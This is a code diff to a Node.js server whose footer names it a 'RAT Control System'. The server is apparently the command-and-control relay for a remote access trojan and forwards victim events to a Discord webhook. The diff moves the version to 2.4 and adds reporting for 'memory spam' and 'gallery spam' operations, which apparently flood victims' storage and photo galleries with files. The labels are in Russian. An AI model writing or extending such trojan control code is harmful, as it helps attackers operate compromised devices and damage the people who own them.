@@ -15,7 +15,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
         fields: fields,
         timestamp: new Date().toISOString(),
         footer: {
-            text: "RAT Control System v2.3"
+            text: "RAT Control System v2.4"
         }
     };
 
@@ -62,6 +62,24 @@ const server = http.createServer((req, res) => {
                         [
                             { name: "IP информация", value: args[2] || "N/A", inline: false }
                         ]
+                    );
+                } else if (command === "memory_spam_start") {
+                    await sendDiscordMessage(
+                        "💾 Memory Spam запущен",
+                        `**Количество файлов:** ${args[0]}\n**Статус:** Выполняется`,
+                        0xff6b6b
+                    );
+                } else if (command === "gallery_spam_start") {
+                    await sendDiscordMessage(
+                        "🖼️ Gallery Spam запущен",
+                        `**Количество копий:** ${args[0]}\n**Файл:** ${args[1]}`,
+                        0x74b9ff
+                    );
+                } else if (command === "spam_completed") {
+                    await sendDiscordMessage(
+                        "✅ Spam операция завершена",
+                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
+                        0x00ff00
                     );
                 }
 
@@ -170,7 +188,7 @@ const server = http.createServer((req, res) => {
     if (req.method === 'GET' && req.url === '/status') {
         res.end(JSON.stringify({
             status: "online",
-            version: "2.3.0",
+            version: "2.4.0",
             timestamp: new Date().toISOString(),
             commands_processed: lastCommand ? 1 : 0
         }));
@@ -183,6 +201,6 @@ const server = http.createServer((req, res) => {
 
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
-    console.log("📊 Версия: 2.3.0");
+    console.log("📊 Версия: 2.4.0");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
 });
